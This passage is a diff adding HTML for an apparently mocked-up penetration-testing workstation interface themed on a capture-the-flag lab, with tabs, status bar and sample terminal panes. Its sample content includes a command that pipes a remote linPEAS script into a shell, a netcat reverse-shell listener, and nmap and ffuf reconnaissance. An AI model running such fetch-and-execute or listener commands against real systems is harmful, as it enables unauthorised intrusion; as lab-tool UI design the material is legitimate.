+                <div role="tablist" aria-label="Host" style="display: grid; grid-auto-flow: column; justify-content: start;">
+                  <button class="htab" role="tab" aria-selected="true">Next<span class="mark"></span></button>
+                  <button class="htab" role="tab" aria-selected="false">Log</button>
+                  <button class="htab" role="tab" aria-selected="false">Findings</button>
+                </div>
+                <div style="display: grid; grid-auto-flow: column; gap: 16px; align-items: center;">
+                  <x-import component-from-global-scope="Raven.Button" size="sm">Full checklist</x-import>
+                  <x-import component-from-global-scope="Raven.Button" size="sm">Stuck?</x-import>
+                </div>
+              </div>
+              <div style="display: grid; align-content: start; overflow: hidden;">
+                <div class="goal">
+                  <span style="display: grid; place-items: center; height: 20px; color: #8a8a8a;"><svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true"><circle cx="8" cy="8" r="6" fill="none" stroke="currentColor" stroke-width="1.5"></circle></svg></span>
+                  <div style="display: grid; gap: 8px; min-width: 0;">
+                    <span style="color: #ffffff;">Run linPEAS</span>
+                    <div class="cmd"><p class="cmd__t">curl -s http://192.168.45.181:8008/linpeas.sh | sh</p>
+                      <button class="icon-button" aria-label="Send to terminal"><svg class="ic" width="16" height="16" viewBox="0 0 256 256" fill="currentColor" aria-hidden="true"><path d="M128,128a8,8,0,0,1-3,6.25l-40,32a8,8,0,1,1-10-12.5L107.19,128,75,102.25a8,8,0,1,1,10-12.5l40,32A8,8,0,0,1,128,128Zm48,24H136a8,8,0,0,0,0,16h40a8,8,0,0,0,0-16Zm56-96V200a16,16,0,0,1-16,16H40a16,16,0,0,1-16-16V56A16,16,0,0,1,40,40H216A16,16,0,0,1,232,56ZM216,200V56H40V200H216Z"></path></svg></button>
+                      <x-import component-from-global-scope="Raven.IconButton" icon="Copy" label="Copy" shortcut="⌘C"></x-import>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </main>
+
+        <!-- Terminal panel -->
+        <section aria-label="Terminal" style="display: grid; grid-template-rows: 36px minmax(0, 1fr); border-top: 1px solid #1f1f1f; min-height: 0; min-width: 0;">
+          <div style="display: grid; grid-template-columns: minmax(0, 1fr) max-content; align-items: center; padding-right: 8px; border-bottom: 1px solid #1f1f1f;">
+            <div role="tablist" aria-label="Terminals" style="display: grid; grid-auto-flow: column; justify-content: start; align-items: center;">
+              <button class="term-tab" role="tab" aria-selected="true" style="color: #ffffff;">
+                <svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"><path d="M3 5l3 3-3 3"></path><path d="M8 11h5"></path></svg>
+                <span>kali</span>
+                <span style="position: absolute; left: 8px; right: 8px; bottom: -1px; height: 2px; background: #c6ff00;"></span>
+              </button>
+              <button class="term-tab" role="tab" aria-selected="false">
+                <svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"><path d="M3 5l3 3-3 3"></path><path d="M8 11h5"></path></svg>
+                <span>nc 4444</span>
+              </button>
+              <button class="term-tab" role="tab" aria-selected="false">
+                <svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"><path d="M3 5l3 3-3 3"></path><path d="M8 11h5"></path></svg>
+                <span>python3 8008</span>
+              </button>
+              <x-import component-from-global-scope="Raven.IconButton" icon="Plus" label="New terminal" shortcut="⌃⇧`"></x-import>
+            </div>
+            <div style="display: grid; grid-auto-flow: column; gap: 8px; align-items: center;">
+              <x-import component-from-global-scope="Raven.Toggle" on="{{yes}}" on-change="{{noop}}" keys="⌘⇧C">Capture to engagement</x-import>
+              <button class="icon-button" aria-label="Screenshot pane" title="Screenshot pane · ⌘⇧S"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 256 256" fill="currentColor"><path d="M208,56H180.28L166.65,35.56A8,8,0,0,0,160,32H96a8,8,0,0,0-6.65,3.56L75.71,56H48A24,24,0,0,0,24,80V192a24,24,0,0,0,24,24H208a24,24,0,0,0,24-24V80A24,24,0,0,0,208,56Zm8,136a8,8,0,0,1-8,8H48a8,8,0,0,1-8-8V80a8,8,0,0,1,8-8H80a8,8,0,0,0,6.66-3.56L100.28,48h55.43l13.63,20.44A8,8,0,0,0,176,72h32a8,8,0,0,1,8,8ZM128,88a44,44,0,1,0,44,44A44.05,44.05,0,0,0,128,88Zm0,72a28,28,0,1,1,28-28A28,28,0,0,1,128,160Z"></path></svg></button>
+              <button class="icon-button" aria-label="Split pane"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 256 256" fill="currentColor"><path d="M200,40H56A16,16,0,0,0,40,56V200a16,16,0,0,0,16,16H200a16,16,0,0,0,16-16V56A16,16,0,0,0,200,40ZM56,56h64V200H56ZM200,200H136V56h64V200Z"></path></svg></button>
+              <x-import component-from-global-scope="Raven.IconButton" icon="ArrowsOut" label="Maximize terminal" shortcut="⌃⇧M"></x-import>
+              <x-import component-from-global-scope="Raven.IconButton" icon="X" label="Hide terminal" shortcut="⌃`"></x-import>
+            </div>
+          </div>
+
+          <div class="ws-split" style="display: grid; grid-template-columns: minmax(0, 1fr) 320px; min-height: 0;">
+            <!-- Main shell pane -->
+            <div class="mono" style="display: grid; align-content: start; padding: 12px 0; font-size: 13px; line-height: 20px; color: #e8e8e8; overflow: auto; white-space: pre;">
+              <div style="padding: 0 16px;"><span style="color: #c4c4c4;">kali@kali</span> <span style="color: #a8a8a8;">~/forge</span> <span style="color: #ffffff;">$</span> nmap -sC -sV -p- 10.10.11.42</div>
+              <div style="padding: 0 16px; color: #a8a8a8;">Starting Nmap 7.94SVN</div>
+              <div style="padding: 0 16px;">PORT   STATE    SERVICE VERSION</div>
+              <div style="padding: 0 16px; position: relative;"><span style="position: absolute; left: 8px; top: 4px; bottom: 4px; width: 2px; background: #c6ff00;"></span>21/tcp filtered ftp</div>
+              <div style="padding: 0 16px; position: relative;"><span style="position: absolute; left: 8px; top: 4px; bottom: 4px; width: 2px; background: #c6ff00;"></span>22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3</div>
+              <div style="padding: 0 16px; position: relative;"><span style="position: absolute; left: 8px; top: 4px; bottom: 4px; width: 2px; background: #c6ff00;"></span>80/tcp open     http    Apache httpd 2.4.41</div>
+              <div style="padding: 0 16px; color: #a8a8a8;">Nmap done: 1 IP address (1 host up) scanned in 41.20 seconds</div>
+              <div style="margin: 8px 16px; padding: 4px 8px 4px 12px; display: grid; grid-template-columns: 16px minmax(0, 1fr) max-content; gap: 8px; align-items: center; border: 1px solid #1f1f1f; border-radius: 6px; background: #0b0b0b; font-family: var(--font-ui); white-space: normal; justify-self: start;">
+                <span style="color: #c6ff00;"><x-import component-from-global-scope="Raven.Icon" name="Check"></x-import></span>
+                <span style="font-size: 13px; line-height: 18px; color: #c4c4c4;">3 services captured to forge</span>
+                <x-import component-from-global-scope="Raven.Button" variant="ghost" size="sm">Undo</x-import>
+              </div>
+              <div style="padding: 0 16px;"><span style="color: #c4c4c4;">kali@kali</span> <span style="color: #a8a8a8;">~/forge</span> <span style="color: #ffffff;">$</span> ffuf -u http://forge.htb/FUZZ -w <span style="color: #8a8a8a;">/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</span><span style="display: inline-block; width: 8px; height: 16px; vertical-align: -3px; background: #c6ff00;"></span></div>
+              <div style="margin: 8px 16px; padding: 4px 8px 4px 12px; display: grid; grid-template-columns: 16px minmax(0, 1fr) max-content; gap: 8px; align-items: center; border: 1px solid #1f1f1f; border-radius: 6px; background: #0b0b0b; font-family: var(--font-ui); white-space: normal; justify-self: start;">
+                <span style="color: #a8a8a8; display: grid;"><svg aria-hidden="true" width="16" height="16" viewBox="0 0 256 256" fill="currentColor"><path d="M230.91,172A8,8,0,0,1,228,182.91l-96,56a8,8,0,0,1-8.06,0l-96-56A8,8,0,0,1,36,169.09l92,53.65,92-53.65A8,8,0,0,1,230.91,172ZM220,121.09l-92,53.65L36,121.09A8,8,0,0,0,28,134.91l96,56a8,8,0,0,0,8.06,0l96-56A8,8,0,1,0,220,121.09ZM24,80a8,8,0,0,1,4-6.91l96-56a8,8,0,0,1,8.06,0l96,56a8,8,0,0,1,0,13.82l-96,56a8,8,0,0,1-8.06,0l-96-56A8,8,0,0,1,24,80Zm23.88,0L128,126.74,208.12,80,128,33.26Z"></path></svg></span>
+                <span style="font-size: 13px; line-height: 18px; color: #c4c4c4;">Wordlist from Arsenal</span>
+                <x-import component-from-global-scope="Raven.Button" variant="ghost" size="sm">Insert</x-import>
+              </div>
+            </div>
+
+            <!-- Split: listener pane -->
+            <div class="ws-split-side" style="display: grid; grid-template-rows: 32px minmax(0, 1fr); border-left: 1px solid #1f1f1f; min-height: 0;">
+              <div style="display: grid; grid-template-columns: minmax(0, 1fr) 28px; align-items: center; padding: 0 4px 0 12px; border-bottom: 1px solid #1f1f1f; font-size: 13px; line-height: 18px; color: #a8a8a8;">
+                <span>nc 4444</span>
+                <x-import component-from-global-scope="Raven.IconButton" icon="X" label="Close pane" shortcut="⌘⇧W"></x-import>
+              </div>
+              <div class="mono" style="padding: 12px; font-size: 13px; line-height: 20px; color: #e8e8e8; white-space: pre-wrap; overflow: auto;"><span style="color: #c4c4c4;">kali@kali</span> <span style="color: #ffffff;">$</span> nc -lvnp 4444
+<span style="color: #a8a8a8;">listening on [any] 4444 ...</span></div>
+            </div>
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <!-- Status bar -->
+    <footer style="display: grid; grid-template-columns: repeat(7, max-content) minmax(0, 1fr) max-content; align-items: center; gap: 24px; padding: 0 8px 0 16px; border-top: 1px solid #1f1f1f; font-size: 13px; line-height: 18px; color: #a8a8a8; white-space: nowrap; overflow: hidden;">
+      <div style="display: grid; grid-template-columns: 16px max-content max-content 28px; gap: 8px; align-items: center;">
+        <svg aria-hidden="true" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="#c6ff00" stroke-width="1.25" stroke-linejoin="round" stroke-linecap="round"><path d="M8 1.75 13.25 3.5v4c0 3.25-2.25 5.5-5.25 6.75C5 13 2.75 10.75 2.75 7.5v-4z"></path><path d="M5.75 8 7.25 9.5 10.25 6.5"></path></svg>
+        <span class="section-label">LHOST</span>
+        <span class="mono" style="color: #ffffff;">192.168.45.181</span>
+        <x-import component-from-global-scope="Raven.IconButton" icon="Copy" label="Copy LHOST" shortcut="⌘⇧L"></x-import>
+      </div>
+      <span>2 listeners</span>
+      <span style="display: inline-grid; grid-auto-flow: column; align-items: center; gap: 8px; white-space: nowrap;"><span class="section-label">Rooted</span><span class="mono" style="font-size: 13px; line-height: 18px; color: #ffffff;">0/3</span></span>
+      <span style="display: inline-grid; grid-auto-flow: column; align-items: center; gap: 8px; white-space: nowrap;"><span class="section-label">Flags</span><span class="mono" style="font-size: 13px; line-height: 18px; color: #ffffff;">2/6</span></span>
+      <button style="display: inline-grid; grid-auto-flow: column; align-items: center; gap: 8px; white-space: nowrap; height: 28px; padding: 0 8px; margin: 0 -8px; border: 0; border-radius: 6px; background: transparent; color: inherit; font: inherit;"><span style="color: #e8e8e8;"><svg class="ic" width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M11.353 0h1.368q4.19.218 8.144 1.616.217.077.216.309-.015 4.033-.002 12.102 0 .81-.093 1.173c-.217.845-.76 1.635-1.326 2.325q-.318.388-1.024 1.046-2.955 2.75-6.01 5.094-.183.14-.516.335h-.17q-.627-.42-.945-.673-3.992-3.184-5.442-4.459-1.348-1.185-2.169-2.611c-.369-.64-.466-1.287-.465-2.099q.01-6.048.002-12.218c0-.183.09-.264.261-.325Q7.145.227 11.352 0ZM7.474 7.864q0-.094.069-.031l2.797 2.516a.374.372 21.2 0 1 .122.276l-.006 4.333a.182.182 0 0 0 .183.184l2.524-.018a.11.11 89.8 0 0 .108-.11q-.007-2.201.01-4.461.002-.173.146-.29 1.397-1.145 2.946-2.393.068-.055.068.032v10.881q0 .092.063.024.794-.865 1.628-1.838.71-.83.984-1.87.26-.989.262-1.997.007-4.754.009-9.768a.136.136 0 0 0-.137-.136q-1.15.004-2.424 0c-.287-.002-.441-.022-.619.149Q14.16 5.317 11.982 7.4a.046.046 0 0 1-.062 0Q9.782 5.437 7.769 3.525c-.234-.222-.515-.381-.843-.373q-1.09.026-2.33.005-.184-.004-.184.18-.003 4.54.005 9.032.002.536.036 1.027c.076 1.093.2 2.126.803 3.021.574.852 1.329 1.656 2.126 2.405q.023.022.054.026.04.006.04-.034z"></path></svg></span><span class="section-label">Metasploit</span><span class="mono" style="font-size: 13px; line-height: 18px; color: #c4c4c4;">unused</span></button>
+      <span style="display: inline-grid; grid-auto-flow: column; align-items: center; gap: 8px; white-space: nowrap;"><span class="section-label">Threads</span><span class="mono" style="font-size: 13px; line-height: 18px; color: #ffffff;">3</span></span>
+      <span style="display: inline-grid; grid-auto-flow: column; align-items: center; gap: 8px; white-space: nowrap;"><span class="section-label">Cleanup</span><span class="mono" style="font-size: 13px; line-height: 18px; color: #ffffff;">1</span></span>
+      <span></span>
+      <span style="display: inline-grid; grid-auto-flow: column; align-items: center; gap: 8px; white-space: nowrap;"><span class="section-label">Timebox</span><button class="icon-button" aria-label="Pause timebox" style="margin: 0 -4px;"><svg class="ic" width="16" height="16" viewBox="0 0 256 256" fill="currentColor" aria-hidden="true"><path d="M200,32H160a16,16,0,0,0-16,16V208a16,16,0,0,0,16,16h40a16,16,0,0,0,16-16V48A16,16,0,0,0,200,32Zm0,176H160V48h40ZM96,32H56A16,16,0,0,0,40,48V208a16,16,0,0,0,16,16H96a16,16,0,0,0,16-16V48A16,16,0,0,0,96,32Zm0,176H56V48H96Z"></path></svg></button><svg role="img" aria-label="12% of 24 hours used" width="16" height="16" viewBox="0 0 16 16" style="display: block; transform: rotate(-90deg);"><circle cx="8" cy="8" r="6" fill="none" stroke="#2a2a2a" stroke-width="2"></circle><circle cx="8" cy="8" r="6" fill="none" stroke="#c6ff00" stroke-width="2" stroke-dasharray="4.52 37.7"></circle></svg><span class="mono" style="font-size: 13px; line-height: 18px; color: #c6ff00;">21h 14m left</span></span>
+    </footer>
+  </div>
+</div>
+</div>
+</x-dc>
+<script type="text/x-dc" data-dc-script data-props='{"frameRadius":{"editor":"enum","options":[8,12,16,20],"default":16,"section":"Frame"},"terminalHeight":{"editor":"range","min":200,"max":520,"step":4,"unit":"px","default":360,"section":"Frame"},"$preview":{"width":1440,"height":900}}'>
+class Component extends DCLogic {
+  renderVals() {
+    return {
+      noop: () => {},
+      yes: true,
+      frameRadius: this.props.frameRadius ?? 16,
+      terminalHeight: this.props.terminalHeight ?? 360
+    };
+  }
+}
+</script>
+</body>
+</html>
